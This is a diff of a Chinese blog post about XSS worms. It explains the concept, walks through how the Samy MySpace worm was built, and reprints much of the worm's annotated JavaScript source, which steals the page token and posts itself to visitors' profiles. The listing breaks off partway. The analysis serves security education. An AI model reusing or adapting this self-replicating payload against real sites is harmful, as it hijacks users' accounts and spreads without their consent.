@@ -1,85 +1,26 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next gemini use-motion" lang>
-<head><meta name="generator" content="Hexo 3.9.0">
+<html lang>
+<head>
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="google-site-verification" content="7yRqtT6cCpC-_R-rzM9gUoQGmheV9OZAUKIXrbAsyqE">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sunra.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
 
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="一起探索互联网的秘密">
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="上次博客分析了下XSS的分类和基本的实战方式，这次继续来接受一种XSS病毒。 定义首先我们来分析下什么是XSS蠕虫病毒。 它是一种跨站脚本病毒，大多是用JavaScript编写，突破浏览器的安全限制，它基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户再发送含有蠕虫的内容继续感染安全的用户。">
+  <meta name="description" content="上次博客分析了下XSS的分类和基本的实战方式，这次继续来接受一种XSS病毒。 定义首先我们来分析下什么是XSS蠕虫病毒。 它是一种跨站脚本病毒，大多是用JavaScript编写，突破浏览器的安全限制，它基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户再发送含有蠕虫的内容继续感染安全的用户。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS 蠕虫定义与实战分析">
 <meta property="og:url" content="https://sunra.top/2021/09/19/xss-worm/index.html">
@@ -91,49 +32,24 @@
 <meta name="twitter:title" content="XSS 蠕虫定义与实战分析">
 <meta name="twitter:description" content="上次博客分析了下XSS的分类和基本的实战方式，这次继续来接受一种XSS病毒。 定义首先我们来分析下什么是XSS蠕虫病毒。 它是一种跨站脚本病毒，大多是用JavaScript编写，突破浏览器的安全限制，它基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户再发送含有蠕虫的内容继续感染安全的用户。">
 
+<link rel="canonical" href="https://sunra.top/2021/09/19/xss-worm/">
 
 
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'default'
   };
 </script>
 
-
-
-  <link rel="canonical" href="https://sunra.top/2021/09/19/xss-worm/">
-
-
-
-
-
-<script data-ad-client="ca-pub-8623125811074939" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
   <title>XSS 蠕虫定义与实战分析 | Origin of Ray</title>
   
 
 
-
-
-
-  <script type="text/javascript">
+  <script>
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
@@ -146,222 +62,186 @@
 
 
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="default">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Origin of Ray</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
-      
-        <h1 class="site-subtitle" itemprop="description">一起探索互联网的秘密</h1>
-      
   </div>
 
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Origin of Ray</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一起探索互联网的秘密</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
   </div>
 </div>
+
+
+
 
 <nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
+  <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
-        
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
         <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
-            
-            Categories
-          </a>
-        </li>
-      
 
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
-            
-            Search
-          </a>
-        </li>
-      
-    </ul>
-  
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
 
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
-</div>
+  </li>
+        <li class="menu-item menu-item-archives">
 
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
 
-
-    </div>
-  
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
 </nav>
 
 
 
- </div>
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
     </header>
 
-    <main id="main" class="main">
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
       <div class="main-inner">
         <div class="content-wrap">
-          <div id="content" class="content">
+          
+
+          <div class="content post posts-expand">
             
 
-  <div id="posts" class="posts-expand">
     
-
-  
-
   
   
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
     <link itemprop="mainEntityOfPage" href="https://sunra.top/2021/09/19/xss-worm/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Sun">
-      <meta itemprop="description" content>
       <meta itemprop="image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg">
+      <meta itemprop="name" content="Ray Sun">
+      <meta itemprop="description" content="拨开互联网的迷雾">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Origin of Ray">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">XSS 蠕虫定义与实战分析</h2>
-        
+        <h1 class="post-title" itemprop="name headline">
+          XSS 蠕虫定义与实战分析
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-19T21:44:22+08:00">
-                2021-09-19
-              </time>
-            
+              <span class="post-meta-item-text">Posted on</span>
 
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Security/" itemprop="url" rel="index">
-                    <span itemprop="name">Security</span>
-                  </a>
-                </span>
-
-                
-                
-              
+              <time title="Created: 2021-09-19 21:44:22" itemprop="dateCreated datePublished" datetime="2021-09-19T21:44:22+08:00">2021-09-19</time>
             </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-20 09:37:42" itemprop="dateModified" datetime="2021-09-20T09:37:42+08:00">2021-09-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+            </span>
 
           
 
         </div>
       </header>
-    
 
     
     
     
     <div class="post-body" itemprop="articleBody">
-
-      
-      
 
       
         <p>上次博客分析了下XSS的分类和基本的实战方式，这次继续来接受一种XSS病毒。</p>
@@ -393,754 +273,244 @@ script:eval(document.all.mycode.expr)&#39;)&quot;&gt;</code><br>4) OK，即使�
 <p>10) 当POST请求完成后，我们还要在关注列表上添加一名关注并附上蠕虫代码。代码和新增关注放在同个地方，这样我们只需要发送一个POST请求就可以了。为了获得新的哈希值，我们需要GET请求到该页面，但在此之前，我们必须重新生成POST发送的蠕虫代码。最简单的方式就是抓取我们所在账户页面中的源码，把蠕虫代码解析出来，然后POST发送出去。这能够做到，但现在所有代码都乱码了！啊，我们需要对代码进行URL编码或转义，这样POST请求才可以正确的发送这段代码。奇怪，还是不行。显然，javascript的URL编码和转义函数并不能把所有必要的东西都进行转义，所以我们需要手动来执行一些替换，让关键的数据能够成功转义。我们加上了一小段文字“但最重要的是，samy是我的偶像”。紧随其后，我们加入所有的蠕虫代码。现在，我们有了一个可”自复制“的代码了，如果你愿意，你可以将它称之为蠕虫。</p>
 <p>11) 还有一些限制，比如标签属性赋值的最大长度，这会造成其他的问题，而且要求压缩代码，不可以有空格，模糊的变量命名，可复用的函数</p>
 <h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">mycode</span> <span class="attr">style</span>=<span class="string">”BACKGROUND:</span> <span class="attr">url</span>('<span class="attr">javascript:eval</span>(<span class="attr">document.all.mycode.expr</span>)')” <span class="attr">expr</span>=<span class="string">”</span></span></span><br><span class="line"><span class="tag"><span class="attr">var</span> <span class="attr">B</span> = <span class="string">String.fromCharCode(34);</span> // 双引号</span></span><br><span class="line"><span class="tag"><span class="attr">var</span> <span class="attr">A</span> = <span class="string">String.fromCharCode(39);</span> // 单引号</span></span><br><span class="line"><span class="tag"><span class="attr">function</span> <span class="attr">g</span>() &#123; // 返回文档内容，做了浏览器兼容性处理</span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">C</span>;</span></span><br><span class="line"><span class="tag">    <span class="attr">try</span> &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">var</span> <span class="attr">D</span> = <span class="string">document.body.createTextRange();</span> <span class="attr">C</span> = <span class="string">D.htmlText</span></span></span><br><span class="line"><span class="tag">    &#125; <span class="attr">catch</span> (<span class="attr">e</span>) &#123;&#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">if</span> (<span class="attr">C</span>) &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">return</span> <span class="attr">C</span></span></span><br><span class="line"><span class="tag">    &#125; <span class="attr">else</span> &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">return</span> <span class="attr">eval</span>('<span class="attr">document.body.innerHTML</span>')</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">function</span> <span class="attr">getFromURL</span>(<span class="attr">BF</span>, <span class="attr">BG</span>) &#123; // 从字符串<span class="attr">BF</span>中获取<span class="attr">BG</span>的值</span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">T</span>;</span></span><br><span class="line"><span class="tag">    <span class="attr">if</span> (<span class="attr">BG</span> == <span class="string">'Mytoken'</span>) &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">T</span> = <span class="string">B</span></span></span><br><span class="line"><span class="tag">    &#125; <span class="attr">else</span> &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">T</span> = <span class="string">' &amp; '</span></span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">U</span> = <span class="string">BG</span> + ' = <span class="string">';</span></span></span><br><span class="line"><span class="tag"><span class="string">    var V = BF.indexOf(U) + U.length;</span></span></span><br><span class="line"><span class="tag"><span class="string">    var W = BF.substring(V, V + 1024);</span></span></span><br><span class="line"><span class="tag"><span class="string">    var X = W.indexOf(T);</span></span></span><br><span class="line"><span class="tag"><span class="string">    var Y = W.substring(0, X);</span></span></span><br><span class="line"><span class="tag"><span class="string">    return Y</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">function getData(AU) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    M = getFromURL(AU, '</span><span class="attr">friendID</span>'); // 从<span class="attr">AU</span>中获取<span class="attr">friendID</span>的值</span></span><br><span class="line"><span class="tag">    <span class="attr">L</span> = <span class="string">getFromURL(AU,</span> '<span class="attr">Mytoken</span>') // 从<span class="attr">AU</span>中获取<span class="attr">MyToken</span>的值</span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">function</span> <span class="attr">getQueryParams</span>() &#123; // 将<span class="attr">URL</span>中的<span class="attr">params</span>字符串转化为对象</span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">E</span> = <span class="string">document.location.search;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">F</span> = <span class="string">E.substring(1,</span> <span class="attr">E.length</span>)<span class="attr">.split</span>(' &amp; ');</span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">AS</span> = <span class="string">new</span> <span class="attr">Array</span>();</span></span><br><span class="line">    for (var O = 0; O &lt; F.length; O++) &#123;</span><br><span class="line">        var I = F[O].split(' = ');</span><br><span class="line">        AS[I[0]] = I[1]</span><br><span class="line">    &#125;</span><br><span class="line">    return AS</span><br><span class="line">&#125;</span><br><span class="line">var J;</span><br><span class="line">var AS = getQueryParams();</span><br><span class="line">var L = AS['Mytoken'];</span><br><span class="line">var M = AS['friendID'];</span><br><span class="line">if (location.hostname == 'profile.myspace.com') &#123; // 当前在个人主页，就跳转回myspace的主页</span><br><span class="line">    document.location</span><br><span class="line">        = 'http: //www.myspace.com' + location.pathname + location.search</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (!M) &#123; // 如果从url中没有解析出friendID</span><br><span class="line">        getData(g())  // 就从body中解析friendID和MyToken</span><br><span class="line">    &#125;</span><br><span class="line">    main()</span><br><span class="line">&#125;</span><br><span class="line">function getClientFID() &#123;</span><br><span class="line">    return findIn(g(), 'up_launchIC(' + A, A) // 从body中找up_launchIC('和'之间的内容</span><br><span class="line">&#125;</span><br><span class="line">function nothing() &#123;&#125;</span><br><span class="line">function paramsToString(AV) &#123; // 将对象转化为参数字符串</span><br><span class="line">    var N = new String();</span><br><span class="line">    var O = 0;</span><br><span class="line">    for (var P in AV) &#123;</span><br><span class="line">        if (O &gt; 0) &#123;</span><br><span class="line">            N += ' &amp; '</span><br><span class="line">        &#125;</span><br><span class="line">        var Q = escape(AV[P]);</span><br><span class="line">        while (Q.indexOf(' + ') != -1) &#123;</span><br><span class="line">            Q = Q.replace(' + ', ' % 2B')</span><br><span class="line">        &#125;</span><br><span class="line">        while (Q.indexOf(' &amp; ') != -1) &#123;</span><br><span class="line">            Q = Q.replace(' &amp; ', ' % 26')</span><br><span class="line">        &#125;</span><br><span class="line">        N += P + ' = ' + Q; O++</span><br><span class="line">    &#125;</span><br><span class="line">    return N</span><br><span class="line">&#125;</span><br><span class="line">function httpSend(BH, BI, BJ, BK) &#123;// 分别为url， 返回的处理函数，方法，请求体</span><br><span class="line">    if (!J) &#123;</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">    eval('J.onr' + 'eadystatechange = BI');</span><br><span class="line">    J.open(BJ, BH, true);</span><br><span class="line">    if (BJ == 'POST') &#123;</span><br><span class="line">        J.setRequestHeader('Content - Type', 'application / x - www - form - urlencoded');</span><br><span class="line">        J.setRequestHeader('Content - Length', BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    J.send(BK); return true</span><br><span class="line">&#125;</span><br><span class="line">function findIn(BF, BB, BC) &#123; // 从BF截取BB和BC之间的内容</span><br><span class="line">    var R = BF.indexOf(BB) + BB.length;</span><br><span class="line">    var S = BF.substring(R, R + 1024);</span><br><span class="line">    return S.substring(0, S.indexOf(BC))</span><br><span class="line">&#125;</span><br><span class="line">function getHiddenParameter(BF, BG) &#123;</span><br><span class="line">    return findIn(BF, 'name = ' + B + BG + B + 'value = ' + B, B) // 从BF中找name = "BG"value = 与“之间的值</span><br><span class="line">&#125;</span><br><span class="line">function getXMLObj() &#123;</span><br><span class="line">    var Z = false;</span><br><span class="line">    if (window.XMLHttpRequest) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Z = new XMLHttpRe - quest()</span><br><span class="line">        &#125; catch(e) &#123;</span><br><span class="line">            Z = false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (window.ActiveXObject) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Z = new ActiveXOb - ject('Msxml2.XMLHTTP')</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Z = new ActiveXOb - ject('Microsoft.XMLHTTP')</span><br><span class="line">            &#125; catch (e) &#123;</span><br><span class="line">                Z = false</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return Z</span><br><span class="line">&#125;</span><br><span class="line">var AA = g();</span><br><span class="line">var AB = AA.indexOf('m' + 'ycode');</span><br><span class="line">var AC = AA.substring(AB, AB + 4096);</span><br><span class="line">var AD = AC.indexOf('D' + 'IV');</span><br><span class="line">var AE = AC.substring(0, AD); // 从body中解析出来的蠕虫自身的代码</span><br><span class="line">var AF;</span><br><span class="line">if (AE) &#123;</span><br><span class="line">    AE = AE.replace('jav' + 'a', A + 'jav' + 'a');</span><br><span class="line">    AE = AE.replace('exp' + 'r)', 'exp' + 'r)' + A);</span><br><span class="line">    AF = 'but most of all,samy is my hero. <span class="tag">&lt; <span class="attr">d</span>' + '<span class="attr">iv</span> <span class="attr">id</span> = <span class="string">' + AE + '</span><span class="attr">D</span>' + '<span class="attr">IV</span> &gt;</span> '</span><br><span class="line">&#125;</span><br><span class="line">var AG;</span><br><span class="line">function getHome() &#123;</span><br><span class="line">    if (J.readyState != 4) &#123;</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    var AU = J.responseText;</span><br><span class="line">    AG = findIn(AU, 'P' + 'rofileHeroes', ' <span class="tag">&lt; /<span class="attr">td</span>&gt;</span>'); // 从返回体中找到ProfileHeroes与`<span class="tag">&lt;/<span class="name">td</span>&gt;</span>`之间的内容</span><br><span class="line">    AG = AG.substring(61, AG.length);</span><br><span class="line">    if (AG.indexOf('samy') == -1) &#123;</span><br><span class="line">        if (AF) &#123;</span><br><span class="line">            AG += AF;</span><br><span class="line">            var AR = getFromURL(AU, 'Mytoken');</span><br><span class="line">            var AS = new Ar - ray();</span><br><span class="line">            AS['interestLabel'] = 'heroes';</span><br><span class="line">            AS['submit'] = 'Preview';</span><br><span class="line">            AS['interest'] = AG;</span><br><span class="line">            J = getXMLObj();</span><br><span class="line">            // 分别为url， 返回的处理函数，方法，请求体</span><br><span class="line">            httpSend('/index.cfm ? fuseaction = profile.previewInterests &amp; Mytoken = ' + AR,</span><br><span class="line">                postHero, 'POST', paramsToString(AS))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function postHero() &#123;</span><br><span class="line">    if (J.readyState != 4) &#123;</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    var AU = J.responseText;</span><br><span class="line">    var AR = getFromURL(AU, 'Mytoken');</span><br><span class="line">    var AS = new Ar - ray();</span><br><span class="line">    AS['interestLabel'] = 'heroes';</span><br><span class="line">    AS['submit'] = 